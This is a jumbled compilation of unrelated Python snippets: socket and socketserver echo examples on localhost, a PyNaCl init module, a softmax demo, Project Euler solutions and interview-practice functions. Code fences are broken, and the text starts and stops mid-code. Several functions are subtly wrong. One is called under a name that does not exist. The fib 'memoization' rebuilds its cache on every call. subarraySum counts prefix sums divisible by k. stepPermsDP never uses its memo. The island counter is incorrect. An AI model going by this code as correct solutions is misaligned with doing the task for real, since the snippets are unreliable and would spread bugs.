            data, server = sock.recvfrom(16)
        except socket.timeout:
            print('timed out, no more responses')
            break
        else:
            print('received {!r} from {}'.format(
                data, server))

finally:
    print('closing socket')
    sock.close()

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyParent/child communication through a socket pair.```


```py

#end_pymotw_header
import socket
import os

parent, child = socket.socketpair()

pid = os.fork()

if pid:
    print('in parent, sending message')
    child.close()
    parent.sendall(b'ping')
    response = parent.recv(1024)
    print('response from child:', response)
    parent.close()

else:
    print('in child, waiting for message')
    parent.close()
    message = child.recv(1024)
    print('message from parent:', message)
    child.sendall(b'pong')
    child.close()

#!/usr/bin/env python3```


```pyEcho server example for SocketServer```


```py

#end_pymotw_header
import socketserver


class EchoRequestHandler(socketserver.BaseRequestHandler):

    def handle(self):
        # Echo the back to the client
        data = self.request.recv(1024)
        self.request.send(data)
        return


if __name__ == '__main__':
    import socket
    import threading

    address = ('localhost', 0)  # let the kernel assign a port
    server = socketserver.TCPServer(address, EchoRequestHandler)
    ip, port = server.server_address  # what port was assigned?

    t = threading.Thread(target=server.serve_forever)
    t.setDaemon(True)  # don't hang on exit
    t.start()

    # Connect to the server
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))

    # Send the data
    message = 'Hello, world'.encode()
    print('Sending : {!r}'.format(message))
    len_sent = s.send(message)

    # Receive a response
    response = s.recv(len_sent)
    print('Received: {!r}'.format(response))

    # Clean up
    server.shutdown()
    s.close()
    server.socket.close()

#!/usr/bin/env python3```


```pyEcho server example for socketserver```


```py

#end_pymotw_header
import os
import socketserver


class ForkingEchoRequestHandler(socketserver.BaseRequestHandler):

    def handle(self):
        # Echo the back to the client
        data = self.request.recv(1024)
        cur_pid = os.getpid()
        response = b'%d: %s' % (cur_pid, data)
        self.request.send(response)
        return


class ForkingEchoServer(socketserver.ForkingMixIn,
                        socketserver.TCPServer,
                        ):
    pass


if __name__ == '__main__':
    import socket
    import threading

    address = ('localhost', 0)  # let the kernel assign a port
    server = ForkingEchoServer(address,
                               ForkingEchoRequestHandler)
    ip, port = server.server_address  # what port was assigned?

    t = threading.Thread(target=server.serve_forever)
    t.setDaemon(True)  # don't hang on exit
    t.start()
    print('Server loop running in process:', os.getpid())

    # Connect to the server
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))

    # Send the data
    message = 'Hello, world'.encode()
    print('Sending : {!r}'.format(message))
    len_sent = s.send(message)

    # Receive a response
    response = s.recv(1024)
    print('Received: {!r}'.format(response))

    # Clean up
    server.shutdown()
    s.close()
    server.socket.close()

#!/usr/bin/env python3```


```pyEcho server example for socketserver```


```py

#end_pymotw_header
import threading
import socketserver


class ThreadedEchoRequestHandler(
        socketserver.BaseRequestHandler,
):

    def handle(self):
        # Echo the back to the client
        data = self.request.recv(1024)
        cur_thread = threading.currentThread()
        response = b'%s: %s' % (cur_thread.getName().encode(),
                                data)
        self.request.send(response)
        return


class ThreadedEchoServer(socketserver.ThreadingMixIn,
                         socketserver.TCPServer,
                         ):
    pass


if __name__ == '__main__':
    import socket

    address = ('localhost', 0)  # let the kernel assign a port
    server = ThreadedEchoServer(address,
                                ThreadedEchoRequestHandler)
    ip, port = server.server_address  # what port was assigned?

    t = threading.Thread(target=server.serve_forever)
    t.setDaemon(True)  # don't hang on exit
    t.start()
    print('Server loop running in thread:', t.getName())

    # Connect to the server
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))

    # Send the data
    message = b'Hello, world'
    print('Sending : {!r}'.format(message))
    len_sent = s.send(message)

    # Receive a response
    response = s.recv(1024)
    print('Received: {!r}'.format(response))

    # Clean up
    server.shutdown()
    s.close()
    server.socket.close()

# Copyright 2013 Donald Stufft and individual contributors
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
from __future__ import absolute_import, division, print_function

from nacl import exceptions as exc
from nacl._sodium import ffi, lib
from nacl.exceptions import ensure


def _sodium_init():
    ensure(lib.sodium_init() != -1,
           "Could not initialize sodium",
           raising=exc.RuntimeError)


def sodium_init():
    """
    Initializes sodium, picking the best implementations available for this
    machine.
    """
    ffi.init_once(_sodium_init, "libsodium")
````

````py
This script demonstrates the implementation of the Softmax function.

Its a function that takes as input a vector of K real numbers, and normalizes
it into a probability distribution consisting of K probabilities proportional
to the exponentials of the input numbers. After softmax, the elements of the
vector always sum up to 1.

Script inspired from its corresponding Wikipedia article
https://en.wikipedia.org/wiki/Softmax_function```


```py

import numpy as np


def softmax(vector):
    """
    Implements the softmax function

    Parameters:
        vector (np.array,list,tuple): A  numpy array of shape (1,n)
        consisting of real values or a similar list,tuple


    Returns:
        softmax_vec (np.array): The input numpy array  after applying
        softmax.

    The softmax vector adds up to one. We need to ceil to mitigate for
    precision
    >>> np.ceil(np.sum(softmax([1,2,3,4])))
    1.0

    >>> vec = np.array([5,5])
    >>> softmax(vec)
    array([0.5, 0.5])

    >>> softmax([0])
    array([1.])
    """

    # Calculate e^x for each x in your vector where e is Euler's
    # number (approximately 2.718)
    exponentVector = np.exp(vector)

    # Add up the all the exponentials
    sumOfExponents = np.sum(exponentVector)

    # Divide every exponent by the sum of all exponents
    softmax_vector = exponentVector / sumOfExponents

    return softmax_vector


if __name__ == "__main__":
    print(softmax((0,)))

from itertools import permutations
def main():
 result=list(map("".join, permutations('0123456789')))
 print(result[999999])

if __name__ == '__main__':
 main()
from math import factorial
def main():
 print(sum([int(x) for x in str(factorial(100))]))
if __name__ == '__main__':
 main()
'''
Problem:
Each new term in the Fibonacci sequence is generated by adding the previous two terms.
                0,1,1,2,3,5,8,13,21,34,55,89,..
Every third term from 0 is even So using this I have written a simple code
By considering the terms in the Fibonacci sequence whose values do not exceed n, find the sum of the even-valued terms.
e.g. for n=10, we have {2,8}, sum is 10.
'''```


```pyPython 3"""
n = int(input())
a=0
b=2
count=0
while 4*b+a<n:
    c=4*b+a
    a=b
    b=c
    count=count+a
print(count+b)

````

````py
We shall say that an n-digit number is pandigital if it makes use of all the
digits 1 to n exactly once; for example, the 5-digit number, 15234, is 1 through
5 pandigital.

The product 7254 is unusual, as the identity, 39 × 186 = 7254, containing
multiplicand, multiplier, and product is 1 through 9 pandigital.

Find the sum of all products whose multiplicand/multiplier/product identity can
be written as a 1 through 9 pandigital.

HINT: Some products can be obtained in more than one way so be sure to only
include it once in your sum.```


```py
import itertools


def isCombinationValid(combination):
    """
    Checks if a combination (a tuple of 9 digits)
    is a valid product equation.

    >>> isCombinationValid(('3', '9', '1', '8', '6', '7', '2', '5', '4'))
    True

    >>> isCombinationValid(('1', '2', '3', '4', '5', '6', '7', '8', '9'))
    False

    """
    return (
        int("".join(combination[0:2])) * int("".join(combination[2:5]))
        == int("".join(combination[5:9]))
    ) or (
        int("".join(combination[0])) * int("".join(combination[1:5]))
        == int("".join(combination[5:9]))
    )


def solution():
    """
    Finds the sum of all products whose multiplicand/multiplier/product identity
    can be written as a 1 through 9 pandigital

    >>> solution()
    45228
    """

    return sum(
        {
            int("".join(pandigital[5:9]))
            for pandigital in itertools.permutations("123456789")
            if isCombinationValid(pandigital)
        }
    )


if __name__ == "__main__":
    print(solution())

def mulitples(limit):
    xmulti = []
    zmulti = []
    z = 3
    x = 5
    temp = 1
    while True:
        result = z * temp
        if (result < limit):
            zmulti.append(result)
            temp += 1
        else:
            temp = 1
            break
    while True:
        result = x * temp
        if (result < limit):
            xmulti.append(result)
            temp += 1
        else:
            break
    collection = list(set(xmulti+zmulti))
    return (sum(collection))






print (mulitples(1000))
````

````py
Project Euler Problem 1: https://projecteuler.net/problem=1

Multiples of 3 and 5

If we list all the natural numbers below 10 that are multiples of 3 or 5,
we get 3, 5, 6 and 9. The sum of these multiples is 23.

Find the sum of all the multiples of 3 or 5 below 1000.```


```py


def solution(n: int = 1000) -> int:
    """
    Returns the sum of all the multiples of 3 or 5 below n.
    A straightforward pythonic solution using list comprehension.

    >>> solution(3)
    0
    >>> solution(4)
    3
    >>> solution(10)
    23
    >>> solution(600)
    83700
    """

    return sum([i for i in range(n) if i % 3 == 0 or i % 5 == 0])


if __name__ == "__main__":
    print(f"{solution() = }")
````

````py
Project Euler Problem 1: https://projecteuler.net/problem=1

Multiples of 3 and 5

If we list all the natural numbers below 10 that are multiples of 3 or 5,
we get 3, 5, 6 and 9. The sum of these multiples is 23.

Find the sum of all the multiples of 3 or 5 below 1000.```


```py


def solution(n: int = 1000) -> int:
    """
    Returns the sum of all the multiples of 3 or 5 below n.

    >>> solution(3)
    0
    >>> solution(4)
    3
    >>> solution(10)
    23
    >>> solution(600)
    83700
    """

    a = 3
    result = 0
    while a < n:
        if a % 3 == 0 or a % 5 == 0:
            result += a
        elif a % 15 == 0:
            result -= a
        a += 1
    return result


if __name__ == "__main__":
    print(f"{solution() = }")
````

````py
Project Euler Problem 1: https://projecteuler.net/problem=1

Multiples of 3 and 5

If we list all the natural numbers below 10 that are multiples of 3 or 5,
we get 3, 5, 6 and 9. The sum of these multiples is 23.

Find the sum of all the multiples of 3 or 5 below 1000.```


```py


def solution(n: int = 1000) -> int:
    """
    Returns the sum of all the multiples of 3 or 5 below n.

    >>> solution(3)
    0
    >>> solution(4)
    3
    >>> solution(10)
    23
    >>> solution(600)
    83700
    """

    result = 0
    for i in range(n):
        if i % 3 == 0:
            result += i
        elif i % 5 == 0:
            result += i
    return result


if __name__ == "__main__":
    print(f"{solution() = }")
````

````py
The nth term of the sequence of triangle numbers is given by, tn = ½n(n+1); so
the first ten triangle numbers are:

1, 3, 6, 10, 15, 21, 28, 36, 45, 55, ...

By converting each letter in a word to a number corresponding to its
alphabetical position and adding these values we form a word value. For example,
the word value for SKY is 19 + 11 + 25 = 55 = t10. If the word value is a
triangle number then we shall call the word a triangle word.

Using words.txt (right click and 'Save Link/Target As...'), a 16K text file
containing nearly two-thousand common English words, how many are triangle
words?```


```py
import os

# Precomputes a list of the 100 first triangular numbers
TRIANGULAR_NUMBERS = [int(0.5 * n * (n + 1)) for n in range(1, 101)]


def solution():
    """
    Finds the amount of triangular words in the words file.

    >>> solution()
    162
    """
    script_dir = os.path.dirname(os.path.realpath(__file__))
    wordsFilePath = os.path.join(script_dir, "words.txt")

    words = ""
    with open(wordsFilePath) as f:
        words = f.readline()

    words = list(map(lambda word: word.strip('"'), words.strip("\r\n").split(",")))
    words = list(
        filter(
            lambda word: word in TRIANGULAR_NUMBERS,
            map(lambda word: sum(map(lambda x: ord(x) - 64, word)), words),
        )
    )
    return len(words)


if __name__ == "__main__":
    print(solution())

def drawRectangle(canvas, r):
    x, y, x1, y1 = r
    canvas[x][y], canvas[x][y1 + y], canvas[x1][y], canvas[x1][y + y1] = ["*"] * 4
    for j in range(y + 1, y + y1):
        canvas[x][j] = "|"
        canvas[x1][j] = "|"
    return canvas


canvas = [
    ["a", "a", "a", "a", "a", "a", "a", "a"],
    ["a", "a", "a", "a", "a", "a", "a", "a"],
    ["a", "a", "a", "a", "a", "a", "a", "a"],
    ["b", "b", "b", "b", "b", "b", "b", "b"],
    ["b", "b", "b", "b", "b", "b", "b", "b"],
]
rectangle = [1, 1, 4, 3]
print(drawRectangle(canvas, rectangle))

def countPalindromes(s):
    """
    countPalindromes(s) takes in a string s and returns the number of palindrome in the string
    :param s: a string
    :return: number of palindrome sub strings
    """
    tot_pal = len(s)
    for i in range(len(s)):
        tot_pal += helper(s, i, i + 1)
        tot_pal += helper(s, i - 1, i + 1)
    return tot_pal


def helper(s, l, r):
    tot = 0
    while (l >= 0) and (r < len(s)) and (s[l] == s[r]):
        tot += 1
        l -= 1
        r += 1
    return tot


print(countPalindromes("aaa"))

def reverseInParentheses(s):
    """
    takes in a string that has substrings inside Parentheses, return a string with all substrings inside the Parentheses
    reversed
    """
    stack = []
    for i in s:
        if i == ")":
            ind = len(stack) - 1
            while stack[ind] != "(":
                ind -= 1
            stack[ind : len(stack) + 1] = stack[ind : len(stack) + 1][::-1]
            stack.pop()
        else:
            stack.append(i)
    return "".join(stack)


print(reverse_in_bracts("abc(klm(nz))"))

def boxBlur(image):
    out = []
    for i in range(len(image) - 2):
        out.append(
            [
                (
                    sum(image[i][j : j + 3])
                    + sum(image[i + 1][j : j + 3])
                    + sum(image[i + 2][j : j + 3])
                )
                // 9
                for j in range(len(image[i]) - 2)
            ]
        )
    return out


image = [[7, 4, 0, 1], [5, 6, 2, 2], [6, 10, 7, 8], [1, 4, 2, 0]]
print(boxBlur(image))

def twoSum(nums, target):
    """
    Given an array of integers, return indices of the two numbers such that they add up to a specific target.
    You may assume that each input would have exactly one solution, and you may not use the same element twice.
    """
    h = {}
    for i, v in enumerate(nums):
        if v in h:
            return [h[v], i]
        else:
            rem = target - v
            h[rem] = i


nums = [2, 7, 11, 15]
target = 9
print(twoSum(nums, target))
````

````py
find the smallest substring that contains all of the distinct chars of the string```


```py


def shortestSubstring(s):
    diff_chars, start, big = len(set(s)), 0, len(s)
    end = diff_chars
    while end <= len(s):
        curr = len(set(s[start:end]))
        if curr == diff_chars:
            if end - start < big:
                big = end - start
            start += 1
        else:
            end += 1
    return big


print(shortestSubstring("abbddccabd"))

def minX(arr):
    """
    given an arr, get the min number that can keep the running sum greater than or equal to 1
    """
    m = min(arr)
    if m > 0:
        return (m * -1) + 1
    else:
        m = (m * -1) + 1
    running_sum = m
    for val in arr:
        if running_sum + val >= 1:
            running_sum += val
        else:
            m += 1 - (running_sum + val)
            running_sum = 1
    return m


arr = [-5, -2, -4]
print(minX(arr))

import re


def minimumOnStack(operations):
    l = []
    out = []
    for i in operations:
        if "push" in i:
            l.append(int(i[i.index(" ") + 1 :]))
        elif "pop" in i:
            l.pop()
        else:
            out.append(min(l))
    return out


operations = [
    "push 10",
    "min",
    "push 5",
    "min",
    "push 8",
    "min",
    "pop",
    "min",
    "pop",
    "min",
]
print(minimumOnStack(operations))

def areFollowingPatterns(strings, patterns):
    d = {}
    for ele in range(len(strings)):
        if d.get(strings[ele]):
            if d[strings[ele]] != patterns[ele]:
                return False
        elif patterns[ele] in d.values():
            return False
        else:
            d[strings[ele]] = patterns[ele]
    return True


strings = ["cat", "dog", "doggy"]
patterns = ["a", "b", "b"]

print(areFollowingPatterns(strings, patterns))

import itertools as it


def letter_combinations(digits):
    m = {
        "2": "abc",
        "3": "def",
        "4": "ghi",
        "5": "jkl",
        "6": "mno",
        "7": "pqrs",
        "8": "tuv",
        "9": "wxyz",
    }

    possibilities = [m[x] for x in digits if x not in ["0", "1"]]
    # using cartesian product
    return ["".join(x) for x in it.product(*possibilities) if x]


print(letter_combinations("42"))

def sudoku2(grid):
    """
    check if sudoku board is true by checking that the same number didn't appear more than one in its row, col,
    surrounding 3*3 sub matrix
    """
    for i in range(9):
        for j in range(9):
            if i % 3 == 0 and j % 3 == 0:
                l = [
                    grid[s_i][s_j]
                    for s_i in range(i, i + 3)
                    for s_j in range(j, j + 3)
                    if grid[s_i][s_j].isdigit()
                ]
                if len(set(l)) != len(l):
                    return False
            if grid[i][j].isdigit():
                if grid[i].count(grid[i][j]) > 1:
                    return False
                if list(zip(*grid))[j].count(grid[i][j]) > 1:
                    return False
    return True


grid = [
    [".", ".", "5", ".", ".", ".", ".", ".", "."],
    [".", ".", ".", "8", ".", ".", ".", "3", "."],
    [".", "5", ".", ".", "2", ".", ".", ".", "."],
    [".", ".", ".", ".", ".", ".", ".", ".", "."],
    [".", ".", ".", ".", ".", ".", ".", ".", "9"],
    [".", ".", ".", ".", ".", ".", "4", ".", "."],
    [".", ".", ".", ".", ".", ".", ".", ".", "7"],
    [".", "1", ".", ".", ".", ".", ".", ".", "."],
    ["2", "4", ".", ".", ".", ".", "9", ".", "."],
]
print(sudoku2(grid))

def almostIncreasingSequence(sequence):
    for ind in range(len(sequence) - 1):
        if sequence[ind] < sequence[ind + 1]:
            continue
        else:
            if sequence.count(sequence[ind + 1]) > 1:
                sequence.pop(ind + 1)
            else:
                sequence.pop(ind + 1)
        return sequence == sorted(list(set(sequence)))
    return True


print(almostIncreasingSequence([50, 60, 70, 10, 20]))

def sensorsDifferenceSum(sensor_1, sensor_2):
    """
    given two lists contains the reading of two sensors for the same place, give the total difference between
    there elements
    """
    if len(sensor_1) == 0 or len(sensor_2) == 0:
        return 0
    return abs(sensor_1[0] - sensor_2[0]) + sensorsDifferenceSum(
        sensor_1[1:], sensor_2[1:]
    )


print(sensorsDifferenceSum([1, -2, 4, 10], [2, 5, 3, 10]))

def matrix_elements_sum(matrix):
    hunted = []
    total = 0
    ran = len(matrix[0])
    for row in matrix:
        for no in range(ran):
            if no in hunted:
                continue
            elif row[no] == 0:
                hunted.append(no)
            else:
                total += row[no]
    return total


print(matrix_elements_sum([[0, 1, 5, 1], [0, 2, 0, 3], [0, 0, 1, 1]]))

# def sortByHeight(a):
#     for i in range(len(a)):
#         if a[i] != -1:
#             for j in range(i+1, len(a)):
#                 if a[j]!=-1 and a[j]<a[i]:
#                     a[i], a[j] = a[j], a[i]
#     return a


# def sortByHeight(a):
#     b = sorted(a)[a.count(-1):]
#     return [x if x == -1 else b.pop(0) for x in a]
#
# print(sortByHeight([-1, 150, 190, 170, -1, -1, 160, 180]))

# o(log(n)) solution
def swapDiagonals(matrix):
    j = len(matrix) - 1
    for i in range(len(matrix) // 2):
        matrix[i][i], matrix[i][j - i] = matrix[i][j - i], matrix[i][i]
        matrix[j - i][j - i], matrix[j - i][i] = matrix[j - i][i], matrix[j - i][j - i]
    return matrix


matrix = [[1, 2, 3], [4, 5, 6], [7, 8, 9]]

print(swapDiagonals(matrix))

def binarySearch(arr, searchValue):
    low = 0
    high = len(arr) - 1
    while low <= high:
        mid = (low + high) // 2
        if arr[mid] < searchValue:
            low = mid + 1
        elif arr[mid] > searchValue:
            high = mid - 1
        else:
            return True

    return False


def binarySearchRec(arr, search_value):
    if len(arr) == 0:
        return False

def check(first, second, target):
    while first < target:
        first += second
    return first


def isPossible(a, b, c, d):
    # Write your code here
    if c < d:
        a = check(a, b, c)
        b = check(b, a, d)
    else:
        b = check(b, a, d)
        a = check(a, b, c)
    if a != c or b != d:
        return "No"
    return "Yes"


print(isPossible(1, 4, 5, 9))

def isLucky(n):
    """
    isLucky takes in an integer and return True if the sum of its right half == sum of the
     right half
    :param n:
    :return:
    """
    # l = list(map(int, str(n)))
    # return sum(l[0:len(l) // 2]) == sum(l[len(l) // 2:])

    s = str(n)
    return sum(map(int, s[: len(s) // 2])) == sum(map(int, s[len(s) // 2 : len(s)]))


n = 1230
print(isLucky(n))

def subarraySum(nums, k):
    """
    Given an array of integers and an integer k, you need to find the total number of continuous subarrays whose sum equals to k.
    """
    count = 0
    s = 0
    for i in range(len(nums)):
        s += nums[i]
        if s % k == 0:
            count += 1
    return count


nums = [1, 2, 3]
k = 3
print(subarraySum(nums, k))

def beautifulText(inputString, l, r):
    for w in range(l, r + 1):
        i = w
        while i < len(inputString):
            if inputString[i] != " ":
                break
            i += w + 1
        if i == len(inputString):
            return True
    return False


s = "Look at this example of a correct text"
print(beautifulText(s, 5, 15))
````

````py
Given a grid of 1's and 0's, determine the number of adjacent 1's (adjacent means next to it from up, down, left,
right but not diagonally).```


```py

from collections import defaultdict


def onesGroups(grid, quires):
    # global tot
    ans = defaultdict(int)

    for i in range(len(grid)):
        for j in range(len(grid[0])):
            if grid[i][j] == 1:
                # tot = 0
                tot = dfs(grid, i, j, 0)
                ans[tot] += 1
    for i in range(len(quires)):
        if quires[i] in ans:
            quires[i] = ans[quires[i]]
        else:
            quires[i] = 0
    return quires


def dfs(grid, i, j, tot):
    # using global tot, to not be considered in the recursive stack
    # global tot
    if (
        (i < 0)
        or (j < 0)
        or (j >= len(grid[0]))
        or (i >= len(grid))
        or (grid[i][j] == 0)
    ):
        return tot
    if grid[i][j] == 1:
        tot += 1
    grid[i][j] = 0
    tot = dfs(grid, i + 1, j, tot)  # down
    tot = dfs(grid, i - 1, j, tot)  # up
    tot = dfs(grid, i, j + 1, tot)  # right
    tot = dfs(grid, i, j - 1, tot)  # left
    return tot


grid = [[1, 1, 1, 0, 0], [1, 1, 1, 0, 1], [0, 0, 0, 1, 0]]
quires = [1, 2, 6]
print(onesGroups(grid, quires))

# def findProfession(level, pos):
#     if level == 1:
#         return "Engineer"
#     tot_nodes = 1
#     for i in range(1, level - 1):
#         tot_nodes += i*2
#     pos -= tot_nodes
#     while pos not in range(1, 4):
#         pos = (pos - 1)//4
#         pos += 1
#     if pos == 1 or pos == 4:
#
#
#
#
# print(findProfession(3, 12))
#
#

# def reverse(x):
#     if -2147483648 <= x <= 2147483647:
#         x = str(x)
#         if x[0] != "-":
#             return int(x[::-1])
#         else:
#             return int(x[0] + x[1:][::-1])
#     else:
#         return 0
#
#
# print(reverse(-2147483412))
#


s = set()

s.add(123)
s.add(123)
print(s)

def fileNaming(names):
    for i in range(1, len(names)):
        temp = names[i]
        counter = 1
        while temp in names[0:i]:
            temp = f"{names[i]}({counter})"
            counter += 1
        names[i] = temp
    return names


print(fileNaming(["doc", "doc", "image", "doc(1)", "doc"]))

from calendar import weekday as w


def regularMonths(c):
    m, y = map(int, c.split("-"))
    while y:
        for m in range(m + 1, 12 + 1):
            if w(y, m, 1) == 0:
                return f"{str(m).zfill(2)}-{y}"
        m, y = 0, y + 1


print(regularMonths("07-2024"))

# def extractMatrixColumn(matrix, column):
#     return list(list(zip(*matrix))[column])


def extractMatrixColumn(matrix, col):
    return [matrix[i][col] for i in range(len(matrix))]


matrix = [[1, 1, 1, 2], [0, 5, 0, 4], [2, 1, 3, 6]]

print(extractMatrixColumn(matrix, 2))

def rotateImage(a):
    if a == None:
        return None
    a.reverse()
    for i in range(len(a)):
        for j in range(i):
            a[i][j], a[j][i] = a[j][i], a[i][j]
    return a


mat = [[1, 2, 3], [4, 5, 6], [7, 8, 9]]

print(rotateImage(mat))

def amendTheSentence(s):
    out_s = s[0].lower()
    for char in s[1:]:
        if char.islower():
            out_s += char
        else:
            out_s += " " + char.lower()
    return out_s


s = "AHMm"
print(amendTheSentence(s))

import re


def isSentenceCorrect(sentence):
    pattern = "^[A-Z][^?!.]*[?.!]$"
    return re.match(pattern, sentence) is not None


print(isSentenceCorrect("This is an example of *correct* sentence!"))

import re


def nthNumber(s, n):
    pattern = rf"([0-9]+){n}"
    return re.match(pattern, s).group(1)


s = "8one 003number 201numbers li-000233le number4443"
n = 4
print(nthNumber(s, n))

def rodCutting(n, v):
    a = v
    for _ in a:
        a = list(map(max, a, (a[0] + y for y in v)))
        x = a.pop(0)
    return x


n = 4
v = [0, 2, 4, 7, 7]
print(rodCutting(n, v))

# def jobOffers(scores, lowerLimits, upperLimits):
#     for l, u in zip(lowerLimits, upperLimits):
#        yield len([1 for score in scores if l <= score <= u])


# get the index of the first number greater than or equals to the lower
def findLower(scores, len_score, v):
    l = 0
    u = len_score - 1
    while l <= u:
        mid = (l + u) // 2
        if scores[mid] >= v:
            u = mid - 1
        else:
            l = mid + 1
    return l


# get the index of the last element that is less than or equal to v
def findUpper(scores, len_score, v):
    l = 0
    u = len_score - 1
    while l <= u:
        mid = (l + u) // 2
        if scores[mid] > v:
            u = mid - 1
        else:
            l = mid + 1
    return u


def jobOffers(scores, lowerLimits, upperLimits):
    scores.sort()
    n = len(scores)
    for index in range(len(lowerLimits)):
        yield findUpper(scores, n, upperLimits[index]) - findLower(
            scores, n, lowerLimits[index]
        ) + 1


for i in jobOffers([1, 2, 2, 3, 5, 6, 7], [1], [7]):
    print(i)

def powerOfTwo(n):
    if n < 1:
        return []
    l = [1]
    i = 1
    while i + i <= n:
        i += i
        l.append(i)
    return l


print(powerOfTwo(10))

from itertools import permutations


def stringPermutations(s):
    return sorted(list({"".join(itm) for itm in permutations(s)}))


print(stringPermutations("CDA"))

# def kLargestNumber(arr, k):
#     m = 0
#     no = 0
#     for i in arr:
#
#
#
#
# k = 3
# arr = [2, 5, 7, 3, 4, 1, 6]
# print(kLargestNumber(arr, k))
#

def rec_bin(n):
    if n == 0:
        return ""

    else:
        return str(n % 2) + rec_bin(n // 2)


print(rec_bin(20))

print(bin(20)[2:])

import re


def swapAdjacentWords(s):
    return re.sub(r"(\w+) (\w+)", r"\2 \1", s)


s = "How are you guys?"
print(swapAdjacentWords(s))

# """
# given a string, find and return the len of the max sub_str you can create using two elements of the string only,
# with the condition that any element you choose should alter:
# Ex: aababe
# here a is not a valid char because it doesn't alter, while b and e are valid.
# Ans: 3
# """
#


import re
from collections import Counter


def alternate(s):
    d = Counter(s)
    i = 0
    # validate that each letter is not duplicate next to itself
    while i < len(s):
        if s[i] in d:
            if i + 1 < len(s) and s[i + 1] == s[i]:
                del d[s[i]]
        i += 1
    occ = d.values()
    if len(occ) < 2:
        return 0
    m_1 = max(occ)
    m_2 = 0
    ind = True
    for v in occ:
        if ind and v == m_1:
            ind = False
            continue
        elif m_2 < v <= m_1:
            m_2 = v
    return m_1 + m_2


print(alternate("asdcbsdcagfsdbgdfanfghbsfdab"))

# # iterative solution in O(n) time and O(1) space
# def fib(N):
#     """
#     get the Nth fib number
#     """
#     if N <= 1:
#         return N
#     a, b = 0, 1
#     for _ in range(N - 1):
#         a, b = b, a + b
#     return b


# # recursive solution in o(2^n) time
# def fib(N):
#     if N <= 2:
#         f = 1
#     else:
#         f = fib(N - 1) + fib(N - 2)
#     return f


# Dynamic programing (memoized DP)
def fib(N):
    """
    Avoid redoing the something over and over and store any Fib in a dictionary
    to not do it again
    Time: o(n)
    """
    memo = {}
    if N in memo:
        return memo[N]
    if N <= 2:
        f = 1
    else:
        f = fib(N - 1) + fib(N - 2)
    memo[N] = f
    return f


print(fib(5))

def stepPerms(n):
    """
    given n number of stairs, determine the total number of ways to climb the
    stairs if you can take 1, 2, or 3 steps at a time
    """
    if n < 0:
        return 0
    if n == 0:
        return 1
    else:
        return stepPerms(n - 1) + stepPerms(n - 2) + stepPerms(n - 3)


memo = {}


def stepPermsDP(n):
    """
    given n number of stairs, determine the total number of ways to climb the
    stairs if you can take 1, 2, or 3 steps at a time
    """
    if n in memo:
        return memo[n]
    if n < 0:
        return 0
    if n == 0:
        return 1
    else:
        f = stepPerms(n - 1) + stepPerms(n - 2) + stepPerms(n - 3)
    memo[n] = f
    return f


print(stepPermsDP(20))
print(stepPerms(20))

from collections import Counter


def getLargestString(s, k):
    d = Counter(s)
    ord_s = sorted(d.keys(), reverse=True)
    out = ""
    l_p = 0
    while l_p < len(ord_s):
        if d[ord_s[l_p]] < k:
            out += ord_s[l_p] * d[ord_s[l_p]]
            l_p += 1
            continue
        else:
            out += ord_s[l_p] * k
            d[ord_s[l_p]] -= k
            if d[ord_s[l_p]] > 0:
                if len(ord_s) - l_p > 0 and d[ord_s[l_p + 1]] > 0:
                    out += ord_s[l_p + 1]
                    d[ord_s[l_p + 1]] -= 1
                else:
                    break
    return out


s = "xxzzxx"
print(getLargestString(s, 4))

def island(matrix):
    """
    given a two by two matrix, get the number of islands in it, an island is a series of 1's connected in a
    row or a column
    """
    if (not matrix) or len(matrix) == 0:
        return 0
    number_of_islands = 0
    l = [True] * len(matrix[0])
    for i in range(len(matrix)):
        ind = True
        for j in range(len(matrix[0])):
            if matrix[i][j] == 0:
                l[j] = False
                ind = False
        if ind:
            number_of_islands += 1
    return number_of_islands + sum(l)


print(island([[1, 0, 1], [1, 1, 1]]))

from book import Book
from time import time
import random
l = [random.randint(0, 1000) for i in range(0, 100)]

input_sizes = [i * 100 for i in range(1, 50)]

times = []




def insertion_sort(books):
    # loop through len - 1 elements
    for i in range(1, len(books)):
        temp = books[i]
        j = i
        while j > 0 and temp < books[j - 1]:
            # shift left until correct genre is found
            books[j] = books[j - 1]
            j -= 1
        books[j] = temp
    return books

b1 = Book("f", "f", "f")
b2 = Book("e", "e", "e")
b3 = Book("d", "d", "d")
b4 = Book("c", "c", "c")
b5 = Book("b", "b", "b")
b6 = Book("a", "a", "a")
books = [b1, b2, b3, b5, b4, b6]
print(books)

for input_size in input_sizes:
    print(f"Running: {input_size}")
    l = [random.randint(0, 1000) for i in range(0, input_size)]
    # Store start time
    start_time = time()
    # Run some code
    sorted_books = insertion_sort(l)
    # Store end time
    end_time = time()
    # print out end time - start time
    times.append(end_time - start_time)

print("LENGTHS")
for elem in input_sizes:
    print(elem)

print("TIMES")
for t in times:
    print(t)
# function to sort strings
def sortString():
    strr = str(input("Enter : "))
    words = strr.split()
    words.sort()
    print(" ")
    for word in words:
        print(word)


# main code
print("Hello,")
while True:
    startOrEnd = str(input("Start or End : "))
    if startOrEnd == "Start":
        print(" ")
        print(sortString())
        continue
    elif startOrEnd == "End":
        print(" ")
        quit()  # closes interpreter
    else:
        print("Oops Try Again")
        continue

def sort_num(arr, n):
    cnt0 = 0
    cnt1 = 0
    cnt2 = 0
    for i in range(n):
        if arr[i] == 0:
            cnt0 += 1
        elif arr[i] == 1:
            cnt1 += 1
        elif arr[i] == 2:
            cnt2 += 1

    i = 0

    while cnt0 > 0:
        arr[i] = 0
        i += 1
        cnt0 -= 1
    while cnt1 > 0:
        arr[i] = 1
        i += 1
        cnt1 -= 1
    while cnt2 > 0:
        arr[i] = 2
        i += 1
        cnt2 -= 1


def print_arr(arr, n):
    for i in range(n):
        print(arr[i], end=" ")


arr = [0, 1, 2, 0, 1, 2]
n = len(arr)
sort_num(arr, n)
print_arr(arr, n)

def sortByHeight(a):
    heights = []

    # Store all the heights in a list
    for i in range(len(a)):
        if a[i] != -1:
            heights.append(a[i])

    # Sort the heights
